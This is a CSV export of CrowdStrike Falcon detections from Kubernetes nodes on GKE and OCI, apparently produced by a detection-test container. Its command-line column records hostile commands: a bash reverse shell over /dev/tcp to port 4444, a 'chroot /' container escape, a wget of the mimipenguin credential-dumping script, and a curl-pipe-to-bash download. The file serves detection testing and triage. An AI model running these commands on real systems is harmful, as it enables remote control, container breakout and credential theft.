Severity,Time,Worker node,Host ID,Host type,Tactic & technique,Detection name,Container ID,File name,File path,Action taken,Environment,Cluster Name,Command line,Detection description,Detection ID,Image ID,Pod name,Namespace
High,2026-03-18T07:01:58Z,gke-talon-cdr-gke-talon-cdr-gke-node--43ffead4-9poi,adf8885f0e644b86b92b79ea6a59b8be,Server,Privilege Escalation via Escape to Host,"[
    ""ContainerEscape""
   ]",99124f2c497847ead6ea0b90def1002b919b69ecaa9f19a0e386f1d502efd41d,chroot,/usr/sbin/chroot,"Detection, process would have been killed if related prevention policy setting was enabled.",GCP,talon-cdr-gke,chroot /,An attempt to breakout of a container has been detected. Adversaries attempt to escape containers in order to access other containerised resources from the host level or the host itself. Please review the events to determine if this activity was expected.,ind:adf8885f0e644b86b92b79ea6a59b8be:1773817317952824162-30215-2398736,1ccf5d38b50cd9d568feb96bd2d1e46c88763142d5f782a1b023a3fcb4d6a776,--,--
High,2026-03-18T07:01:18Z,gke-talon-cdr-gke-talon-cdr-gke-node--43ffead4-9poi,adf8885f0e644b86b92b79ea6a59b8be,Server,Falcon Intel via Intelligence Indicator - Domain,"[
    ""IntelDomainHigh""
   ]",99124f2c497847ead6ea0b90def1002b919b69ecaa9f19a0e386f1d502efd41d,nslookup,/usr/bin/nslookup,"Detection, standard detection.",GCP,talon-cdr-gke,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:adf8885f0e644b86b92b79ea6a59b8be:1773817275630926877-4900-2324240,1ccf5d38b50cd9d568feb96bd2d1e46c88763142d5f782a1b023a3fcb4d6a776,--,--
High,2026-03-18T07:01:16Z,gke-talon-cdr-gke-talon-cdr-gke-node--43ffead4-9poi,adf8885f0e644b86b92b79ea6a59b8be,Server,Falcon Overwatch via Malicious Activity,"[
    ""TestTriggerHigh""
   ]",99124f2c497847ead6ea0b90def1002b919b69ecaa9f19a0e386f1d502efd41d,bash,/usr/bin/bash,"Detection, standard detection.",GCP,talon-cdr-gke,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:adf8885f0e644b86b92b79ea6a59b8be:1773817276751952482-10304-2310928,1ccf5d38b50cd9d568feb96bd2d1e46c88763142d5f782a1b023a3fcb4d6a776,--,--
High,2026-03-18T07:01:16Z,oke-cnijw5k4dca-nltgyhwal3a-szct6wufnpq-0,189ec1dbaaf34ac4b5f0e02c54aa63de,Server,Falcon Intel via Intelligence Indicator - Domain,"[
    ""IntelDomainHigh""
   ]",7ffd688f352c02fee48c0e79ec9d73480ebce687aeb01b73d215e6b0a589268a,nslookup,/usr/bin/nslookup,"Detection, standard detection.",OCI,--,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:189ec1dbaaf34ac4b5f0e02c54aa63de:1773817273773470900-4900-1137166608,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T07:01:16Z,gke-talon-cdr-gke-talon-cdr-gke-node--43ffead4-9poi,adf8885f0e644b86b92b79ea6a59b8be,Server,Command and Control via Ingress Tool Transfer,"[
    ""CurlWgetMalwareDownload""
   ]",99124f2c497847ead6ea0b90def1002b919b69ecaa9f19a0e386f1d502efd41d,wget,/usr/bin/wget,"Detection, process would have been killed if related prevention policy setting was enabled.",GCP,talon-cdr-gke,wget https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/mimipenguin/mimipenguin.sh,An attempt to download malicious files from the command-line interface has been detected on your host. Adversaries might use curl or wget to download additional payloads in case of compromise. Please review the event to determine if malicious files were downloaded or if this access was expected.,ind:adf8885f0e644b86b92b79ea6a59b8be:1773817276171106304-30126-2290192,1ccf5d38b50cd9d568feb96bd2d1e46c88763142d5f782a1b023a3fcb4d6a776,--,--
High,2026-03-18T07:01:14Z,oke-cnijw5k4dca-nltgyhwal3a-szct6wufnpq-0,189ec1dbaaf34ac4b5f0e02c54aa63de,Server,Privilege Escalation via Escape to Host,"[
    ""ContainerEscape""
   ]",7ffd688f352c02fee48c0e79ec9d73480ebce687aeb01b73d215e6b0a589268a,chroot,/usr/sbin/chroot,"Detection, process would have been killed if related prevention policy setting was enabled.",OCI,--,chroot /,An attempt to breakout of a container has been detected. Adversaries attempt to escape containers in order to access other containerised resources from the host level or the host itself. Please review the events to determine if this activity was expected.,ind:189ec1dbaaf34ac4b5f0e02c54aa63de:1773817274205663154-30215-1137165584,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T07:01:14Z,oke-cnijw5k4dca-nltgyhwal3a-szct6wufnpq-0,189ec1dbaaf34ac4b5f0e02c54aa63de,Server,Command and Control via Ingress Tool Transfer,"[
    ""CurlWgetMalwareDownload""
   ]",7ffd688f352c02fee48c0e79ec9d73480ebce687aeb01b73d215e6b0a589268a,curl,/usr/bin/curl,"Detection, standard detection.",OCI,--,curl -L https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh | bash -s -- --accept-all-defaults,An attempt to download malicious files from the command-line interface has been detected on your host. Adversaries might use curl or wget to download additional payloads in case of compromise. Please review the event to determine if malicious files were downloaded or if this access was expected.,ind:189ec1dbaaf34ac4b5f0e02c54aa63de:1773817274056580204-30126-1137156880,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T07:01:14Z,oke-cnijw5k4dca-nltgyhwal3a-szct6wufnpq-0,189ec1dbaaf34ac4b5f0e02c54aa63de,Server,Falcon Overwatch via Malicious Activity,"[
    ""TestTriggerHigh""
   ]",7ffd688f352c02fee48c0e79ec9d73480ebce687aeb01b73d215e6b0a589268a,bash,/usr/bin/bash,"Detection, standard detection.",OCI,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:189ec1dbaaf34ac4b5f0e02c54aa63de:1773817274049945100-10304-1137155344,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T07:01:14Z,oke-cnijw5k4dca-nltgyhwal3a-szct6wufnpq-0,189ec1dbaaf34ac4b5f0e02c54aa63de,Server,Command and Control via Ingress Tool Transfer,"[
    ""CurlWgetMalwareDownload""
   ]",7ffd688f352c02fee48c0e79ec9d73480ebce687aeb01b73d215e6b0a589268a,wget,/usr/bin/wget,"Detection, process would have been killed if related prevention policy setting was enabled.",OCI,--,wget https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/mimipenguin/mimipenguin.sh,An attempt to download malicious files from the command-line interface has been detected on your host. Adversaries might use curl or wget to download additional payloads in case of compromise. Please review the event to determine if malicious files were downloaded or if this access was expected.,ind:189ec1dbaaf34ac4b5f0e02c54aa63de:1773817273887343002-30126-1137141520,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T07:01:09Z,gke-talon-cdr-gke-talon-cdr-gke-node--43ffead4-9poi,adf8885f0e644b86b92b79ea6a59b8be,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",99124f2c497847ead6ea0b90def1002b919b69ecaa9f19a0e386f1d502efd41d,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",GCP,talon-cdr-gke,"/bin/bash -c 
            exec 5<>/dev/tcp/10.0.0.6/4444;
            cat <&5 | while read line; do $line 2>&5 >&5; done
            ",Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:adf8885f0e644b86b92b79ea6a59b8be:1773817269341969478-30103-2277904,1ccf5d38b50cd9d568feb96bd2d1e46c88763142d5f782a1b023a3fcb4d6a776,--,--
